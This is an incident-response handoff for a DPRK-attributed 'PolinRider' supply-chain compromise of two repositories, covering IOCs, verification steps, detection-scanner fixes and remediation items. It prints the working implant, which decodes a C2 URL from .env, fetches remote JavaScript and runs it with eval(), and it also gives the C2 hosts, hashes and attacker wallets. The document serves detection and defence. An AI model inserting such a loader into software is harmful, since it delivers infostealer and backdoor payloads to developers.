# Handoff — PolinRider Supply-Chain Incident (2026-08-25)

**Purpose:** complete context to resume this investigation in a fresh session. Everything below was verified first-hand during the original session unless marked otherwise.

---

## 1. Incident in one paragraph

Two GitHub repositories were infected with an identical malicious JavaScript implant by the DPRK/Lazarus "PolinRider" campaign (Contagious Interview / Famous Chollima cluster). The implant hides in build/test config files, decodes a base64 C2 URL from a committed `.env`, fetches a payload from a Vercel-hosted endpoint, and `eval()`s it. The payload (hash-confirmed on VirusTotal + urlscan, 30/60 detections) is the campaign's stage-1 loader: deobfuscates itself, resolves C2 via immutable TRON/Aptos/BSC blockchain transactions, delivers **BeaverTail** infostealer → **InvisibleFerret** backdoor (MITRE S1245), and self-propagates by injecting into local project config files and force-pushing backdated commits to repos the victim can push to. **Fully cross-platform** (pure Node JS stage; per-OS persistence for macOS/Linux/Windows).

## 2. Key artifacts & IOCs

**Malicious commits:**
- `the affected public repo` (public): commits `7f75527`, `615257f`, merged to main as `7091cbe` (2026-03-31) via PR #1. Implant in `frontend/jest.config.ts`; `.env` with C2 key. Revert branch `revert-1-module-federation-fix` = `0a0f58d` is **INCOMPLETE** (jest.config.ts + .env still infected). Main was still infected at last check.
- A second, private org repository (internal hotfix repo; details withheld from the public copy of this document — see the internal IR record): malicious commit force-pushed to master 2026-08-24, spoofed/backdated author, implant appended to an Angular service source file, shipped alongside a plausible-looking real Java hotfix as camouflage. Still live on that branch at last check.

**Implant code** (identical both repos):
```ts
import 'dotenv/config';
(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    const response = await proxy(src);
    const proxyInfo = await response.text();
    eval(proxyInfo);
})();  // catch block logs 'Auth Error!'
```
`.env` value: `AUTH_API_KEY="aHR0cHM6Ly9hdXRoLWNvbmZpcm0tZWlnaHQudmVyY2VsLmFwcC9hcGk="` → `https://auth-confirm-eight.vercel.app/api` (dead: HTTP 451 DEPLOYMENT_DISABLED since ~2026-06-15).

**Payload:** SHA-256 `a507b74b6b1e25444c586bc67ae0244cba3037f2b39f25f7eb507ded97c373c1`, MD5 `7cdab8764ec1866a161b5fdaa2b8babe` (matches Vercel ETag — same file), 4,777 bytes single-line obfuscated JS. On VT: 30/60 detections, names include `stage1-encoded.js`. Bytes never retrieved (VT download needs privileged access).

**Detection signatures:** `rmcej%otb%` (layer-1 string), `wuqktamceigynzbosdctpusocrjhrflovnxrt` (scrambled constructor), `AUTH_API_KEY` base64 pattern, `config.bat` newly added to `.gitignore`, CRLF whole-file rewrites burying diffs, oversized (>2.5KB) config files with trailing whitespace padding.

**C2/blockchain IOCs:** `auth-confirm-eight.vercel.app/api`, `auth-rho-dun.vercel.app/api` (served identical hash), `data-kappa.vercel.app/`; TRON `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP`, `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG`; Aptos `0xbe037400...80811e`, `0x3f0e5781...5dce3`; RPC lookups: trongrid, aptoslabs, bsc-dataseed.


## 3. Verification chain (how we know)

git clone/`git show` forensics on both repos → `base64 -d` C2 decode → curl probe (451) → **urlscan.io API** scan `019e7885-c8df-711e-8712-23c5189aae89` (2026-05-30 live capture: hash/size/ETag) → **VirusTotal API** (hash present, MD5↔ETag correlation, Nextron YARA comment) → **MalwareBazaar** (negative control) → **OpenSourceMalware blog** `neutralinojs-compromised-in-dprk-attack` lists our exact payload hash as campaign IOC + full TTP match → **Socket** PolinRider reports. Full details in `/workspace/incident-report-polinrider.md` (7 sections, hyperlinked refs).

## 4. Files in /workspace

| File | Purpose |
|---|---|
| `incident-report-polinrider.md` | Full incident report (exec summary, timeline, tech analysis, verification chain, remediation) |
| `polinrider_scan.sh` | Host detection scanner, Linux/macOS, read-only. Pure ASCII. Auto-uses ripgrep; scans the target dir given as arg 1 (default `$PWD`) plus host-wide sections 2-6; §1 exact hard-IOC signatures + the `A#-####-#` build marker, §1b content-classified configs, §1b2 fake-font payloads, §1c informational-only family patterns scoped to project trees; stage-3 + `/tmp/.npm` staging; verdicts COMPROMISED(1)/SUSPECT(2)/CLEAN(0) driven by hard IOCs only. **Current: 420 lines, md5 `eade63b011f06dc0432dbf1c307e6ce9`** |
| `test_rg_detection.sh` | Fixture test for the scanner's rg path (found 3 real bugs — see §5) |
| `test_config_classification.sh` | Fixture test for oversized-config content classification (§5 item 7) |
| `test_reinfection_vectors.sh` | Fixture test for fake-font payloads (1b2) + node-on-non-JS VS Code tasks (sec 4), incl. negative controls |
| `HANDOFF.md` | This document |

## 5. Scanner evolution / bugs fixed (in order)

1. rg multi-pattern args were treated as PATHS → signatures 2&3 silently never scanned. Fixed: pass each sig as `-e`
2. `--glob '!node_modules/**'` didn't exclude nested dirs → fixed to `-g '!node_modules'` bare-suffix form
3. `local` outside function broke macOS bash 3.2 → removed; added sh/dash interpreter guard
4. Hit counter didn't survive subshells → temp-file based; summary lists all findings + verdict
5. macOS false positives: benign tmpdir executables (jansi/.jnilib/orca-serve/copilot etc. now allowlisted); husky git hooks now content-checked (only `eval(`/`atob(`/`node-fetch`/`AUTH_API_KEY`/`curl|sh` content flags as MALICIOUS-LOOKING)
6. `[: 0\n0: integer expected` at line 177 — `grep -c ... || echo 0` emitted two lines when grep found nothing on macOS; fixed with `tr -dc '0-9'` + `HIGH=${HIGH:-0}`.
7. Oversized-config check was size-only (mass false positives on legit tailwind/next configs). Now content-classifies each: `INFECTED CONFIG` (campaign signature present → counts toward COMPROMISED), `SUSPICIOUS-*` (whitespace padding / >800-char spaceless lines / encoded blobs / string-shuffle arrays → SUSPECT), or `[i] OK` info-only. Validated by `test_config_classification.sh`.
8. Post-triage round 1 (LLM-assisted, 2026-08-25): all 4 remaining findings on the reference scan host were FPs (Cursor cache key-name collision, copilot cache JSON serialization, legit next.config long lines, vite timestamp artifact). Fixes: (a) 3rd signature narrowed to exact fixed-string `atob(process.env.AUTH_API_KEY` — kills key-name collisions; (b) oversized-config scan excludes `~/.cache`, `~/Library/Caches`, `~/.bun`, `~/.cursor`, `~/.vscode*`, and `*.timestamp-*.mjs` artifacts; (c) long-line check requires >800 chars *and* ≤5 spaces (obfuscated payloads are single spaceless tokens). Implant-style file regression-tested: still flagged both as signature and INFECTED CONFIG. Reference host verdict downgraded to CLEAN (host-side) per manual triage.

9. Triage round 2 (LLM-assisted, 2026-08-25): sec 1c's first iteration flagged 28 FPs on the reference host — browser-wallet extensions legitimately using TRON RPCs (Brave/Opera), terser-minified VS Code/Cursor extension bundles matching `_0x` shape, and an anti-bot script cached from browsing. All 0 hits on hard IOCs → host verdict CLEAN. Fixes: (a) 1c scoped to project source trees via `is_scan_scope()` — excludes `Library/Application Support`, `~/.cursor`, `~/.vscode*`, `~/.cache`, `Library/Caches`, `~/.bun`, `~/.npm`, node_modules, .git; (b) all 1c heuristics downgraded to informational `[i]` lines that never touch the findings file or verdict — only hard IOCs (sec 1 exact signatures, 1b INFECTED classification, stage-3 artifacts, persistence, DNS) drive SUSPECT/COMPROMISED; (c) dropped bare RPC-method-name pattern (`eth_call` etc.) — too generic for wallet extensions; kept only hard hostnames + campaign markers (`A#-` global, `helloipbot`, `Sec-V:`, publicnode/bsc-dataseed/1rpc/drpc/blockscout).

10. Additional detections (2026-08-25, threat-intel informed, validated by IR session): (a) sec 1b2 fake-font payload check - any `*.woff2`/`*.woff` without the `wOF2`/`wOFF` magic bytes is flagged and counts toward COMPROMISED (campaign drops JS disguised as fonts, run via `node _.woff2` from VS Code tasks); (b) sec 4 catches `node` run on ANY non-JS-extension file in tasks.json (generalized beyond .woff2); (c) `config.js` added to oversized-config scan list. Validated by new `test_reinfection_vectors.sh` fixture suite. IR-session fix during validation: tasks.json find pattern widened to `tasks*.json` (original only matched exact `tasks.json`, missing variants). One review note: fake-font check is a strong signal (real fonts always have magic bytes) but not campaign-specific - any corrupted "font" also trips it; acceptable given rarity in project trees.

11. Triage round 3 (2026-08-25, after a run on a second engineer workstation). Two rules were returning COMPROMISED on a verified-clean host, and — worse — the noise was *masking a miss*: on the real infected sample the verdict was COMPROMISED only because of these FPs, with zero hits on the file itself. Fixing the FPs alone would have turned that sample CLEAN.

    **False positives removed**
    - (a) §1b2 `check_fake_font()`: `od -An -tx1 -N4` on a file under 4 bytes returns an empty string, which matches no entry in `FONT_MAGICS_HEX`, so every such file was flagged. Real sources: unfetched Git LFS pointers, partial clones, zero-byte build placeholders under `dist/`. Fixed with a `[ "$sz" -lt 4 ] && return` guard *before* the magic comparison — a file that short cannot carry a payload.
    - (b) §2 tmpdir executables: yarn writes `$TMPDIR/yarn--<epoch>-<random>/{node,yarn}` on **every** invocation — 158 B and 312 B `/bin/sh` wrappers holding a single `exec` line. Ten of them on one clean host, all counting toward COMPROMISED. Fixed with `is_tool_shim()`, which content-checks the *shape* (under 1 KB, starts with `#!`, every non-comment line is an `exec`) rather than chasing each tool's temp-dir naming convention. A real dropper is a binary or a large obfuscated script and matches neither test.
    - Measured A/B on that host, empty target dir: **before 10 findings → COMPROMISED; after 0 → CLEAN.** With a `dist/` tree of fonts added: before 13 → COMPROMISED; after 1, the genuinely disguised JS payload.

12. Detection gaps closed in the same round (the reason the FP fix could not ship alone). Positive controls: both real payload builds recovered from the same `karma.conf.js` in a private org repository (repo, path and commit SHAs withheld from the public copy of this document — see the internal IR record). Build **A** 31,010 B, obfuscator.io toolmarks; build **B** 6,350 B, older `_$_` shuffle. Both 33 lines; longest unbroken non-space run 2,977 and **224** respectively.
    - (a) **`karma.conf.*` and `*.conf.js` added to the §1b `find`.** The real infected file was `karma.conf.js` — it was never in the list, so §1b never even opened it.
    - (b) **`SUSPICIOUS-longline` space guard was inverted against the actual evasion.** The old rule was `length($0)>800 && gsub(/ /," ")<=5`, counting spaces across the *entire* line; the payload line carries ~5,000 padding spaces, so the `<=5` guard rejected it. Now measures the longest unbroken **non-space run** and separates injection from minification structurally: run >800 chars **and** at most 2 lines that long **and** more than 5 lines total. Same rule as `polinrider-file-detect.sh`. `*.min.js` excluded from the find, or `lodash.min.js` trips it.
    - (c) **`SUSPICIOUS-pad` now scans the whole file** (`[[:space:]]{200,}`) instead of `tail -c 2000 | grep ' {80,}'`. In the real sample the padding sits at the *start* of the payload, so the last 2000 bytes are pure payload with no spaces at all.
    - (d) **The `A#-####-#` build marker is now a hard IOC**, promoted out of the informational §1c per the evidence: it was the *only* rule that fired on build A, and §1c cannot change the verdict. Two paths, both pinned by fixtures: a size-independent regex sweep in §1 over `*.{js,mjs,cjs,ts,mts}`, and an `INFECTED-marker` branch in `classify_config`. Matched as the pattern `global(\.i|\[.!.\])\s*=\s*["']A?[0-9]-[0-9]{4}-[0-9]` so it survives build-number rotation and covers both spellings (`global.i="A9-3727-2"` and `global['!']='9-3727-2'`). Removed from `REGEX_PATS` so it is not also double-reported as an unactionable `[i]`.
    - **Note on (d): this is load-bearing for the older build.** Its longest unbroken non-space run is only 224 chars, so the structural rule in (b) does *not* catch it. The marker is the only structural signal on that variant.
    - Measured A/B: build A before → 2 informational `[i]` lines and **no hit on the file at all**; after → `campaign build marker` + `INFECTED CONFIG`. Build B before → 2 signature hits, §1b never scanned it; after → signatures + `INFECTED CONFIG`.

13. Usability fix, same round: §6 ran `log show --last 30d` **once per IOC host** (4×). Each call walks the whole unified log and takes minutes, so the scanner looked hung and the fixture suites could not complete — a single fixture run exceeded 5 minutes. Now one `log show` pass, grepped for all hosts, bounded by `POLINRIDER_DNS_TIMEOUT` (default 120 s) so a huge log store degrades to a reported SKIP instead of stalling a fleet run.

14. Fixture suites, same round. `test_config_classification.sh` had **no assertions at all** — it printed classifications and always exited 0. When the pad and longline rules were rewritten, both of its fixtures silently stopped exercising the rule they were written for and the suite still "passed". Rewritten with 10 assertions and a comment on each fixture naming the rule it pins, including a replica of the real evasion shape (payload appended behind ~5,000 spaces in an otherwise normal multi-line config). `test_rg_detection.sh` hard-failed wherever no `rg` **binary** exists — note `rg` is often only a shell function (Claude Code ships one), so `command -v rg` can succeed in an interactive zsh and fail inside the scanner's bash; it now tests whichever engine the scanner will actually pick and skips only the rg-specific comparison. Its signature array was also still the stale bare `AUTH_API_KEY`; it now matches the scanner and carries an explicit regression guard for item 8a.

**Newest md5: `eade63b011f06dc0432dbf1c307e6ce9` (420 lines)** - re-copy before fleet runs.

### Version drift warning (resolved 2026-08-25)

This document previously claimed the newest scanner was **323 lines / md5 `bc4c57bb3fc4ce0d2f0415dc8f6929fe`**. That artifact does not exist in git history at all — it was an in-session copy that predates publication. The real lineage is:

| Commit | Lines | md5 | Note |
|---|---|---|---|
| `bf6edf2` | 326 | `3db8cc8b24ebdc155dc4fef8ddaf522f` | initial publish; scans `$PWD`+`$HOME` |
| `9af7ad6` | 327 | `6514f1862abb9a23ef34c6183703f842` | target dir as arg 1 |
| working tree | 420 | `eade63b011f06dc0432dbf1c307e6ce9` | items 11-14 above |

**Trust `git rev-parse origin/main`, not a pasted md5.** Copies handed around out of band go stale in a way that matters: the 326-line copy still scans all of `$HOME`, which multiplies the FP surface fixed in item 11.

## 6. Scanner result on reference host (engineer workstation, 2026-08-25)

Older copy → verdicts COMPROMISED then SUSPECT across iterations; LLM-assisted triage (2 rounds) confirmed every finding was a false positive (Cursor cache key-name collision, legit configs, husky hooks, benign tmp files, wallet-extension RPC code, minified extension bundles, anti-bot cache) → **final verdict CLEAN (host-side)**. No hard-IOC hits ever. Scanner hardened through sec 5 items 5-9 to suppress all these FP classes. **Still pending: proxy/DNS log check for `*.vercel.app` + public-RPC egress since 2026-03 — host scan cannot prove non-execution.**

## 7. Open items / next steps

1. **Purge implants**: the private hotfix repo's master is still at the malicious HEAD; `the public repo` main still infected (revert `0a0f58d` incomplete — re-apply only the legit module-federation changes cleanly). Scan full git history for signatures after purge.
2. **GitHub org audit logs** (not commit history — dates spoofed): force pushes, new PATs/deploy keys/OAuth apps, all repos. Campaign auto-propagates via any push access.
3. **Fleet scan** with fixed `polinrider_scan.sh` on all Linux/macOS dev + CI machines; collect verdict exit codes.
4. **Proxy/DNS/firewall logs** back to 2026-03-01 for IOC domains — definitive execution evidence.
5. **Rotate**: creds used on machines that built/tested infected branches (from clean machines only); also the 2 GitHub PATs + urlscan/MalwareBazaar/VT keys shared in the original chat session.
6. **Notify**: repo consumers/forks; GitHub Security; Vercel abuse; share IOCs with OpenSourceMalware.
7. Optional: obtain payload bytes via urlscan support (scan UUID in §3) or privileged VT download for first-hand static analysis.

## 9. 2026-08-25 addendum — threat-intel briefing on retrieved sample (LLM-assisted)

A payload-sample analysis performed outside this session reports: build marker `global.i="A9-3727-2"` (DPRK A#-####-# scheme; unpublished → our primary first-party IOC), obfuscator.io toolmarks (`_0x` array + `while(!![])` + single eval), BSC/Eth public-RPC dead-drop via `publicnode.com`, and `getBlockByNumber` retrieval — **not in published DPRK IOCs, possibly novel tradecraft, preserve sample + report to GTIG**. Attribution confirmed: Contagious Interview family (UNC5342 EtherHiding arm; a.k.a. Famous Chollima/DEV#POPPER; = the "PolinRider" name OSM used). Second stage may be OtterCookie in addition to BeaverTail/InvisibleFerret.

**What this changes:**
- Detection must be **structural, not hash-based** (payloads re-obfuscated per wave) → scanner gained §1c: campaign-marker regex, `helloipbot`, RPC-method names, RPC hostnames, `Sec-V:`, obfuscator.io shape (`_0x` + `while(!![])` co-occurrence); `/tmp/.npm` staging check added
- **Containment redefined**: blocking Vercel = hygiene only; the real chokepoint is **public blockchain-RPC egress** — block publicnode/1rpc/drpc/bsc-dataseed/Blockscout/trongrid/aptos-fullnodes at SWG/DNS and alert on non-browser RPC egress (near-zero FP for a non-Web3 org)
- On-chain monitoring of attacker wallet `0xa322e5f3d311d3080e6f0121063e9adc2490ef1a` + JADESNOW contract `0x8eac3198dd72f3e07108c4c7cff43108ad48a71c` for C2 rotation early warning
- Host remediation additions: network-isolate (don't power off), purge npm/yarn caches on all hosts incl. CI, rebuild container images post-exposure, rotate browser cookies too (survive password resets)
- Caveat: the A9-3727-2/publicnod/getBlockByNumber strings were **not re-verified by the IR session** (payload bytes never retrieved there) — confirm provenance of the sample analysis before external reporting

## 8. Key references

- OSM: `opensourcemalware.com/blog/neutralinojs-compromised-in-dprk-attack` (lists our payload hash); `/blog/polinrider-dprk-compromised-hundreds-of-github-repos`; `/blog/developer-guide-getting-over-polinrider` (cleanup order)
- Socket: `socket.dev/blog/polinrider-north-korea-linked-supply-chain-campaign-expands`; IOC tracker `socket.dev/supply-chain-attacks/polinrider`
- VT file `a507b74b6b1e25444c586bc67ae0244cba3037f2b39f25f7eb507ded97c373c1` · urlscan scan `019e7885-c8df-711e-8712-23c5189aae89`
- MITRE S1245 InvisibleFerret, G1052 Contagious Interview · Nextron YARA `SUSP_OBFUSC_JS_Patterns_Jul26`
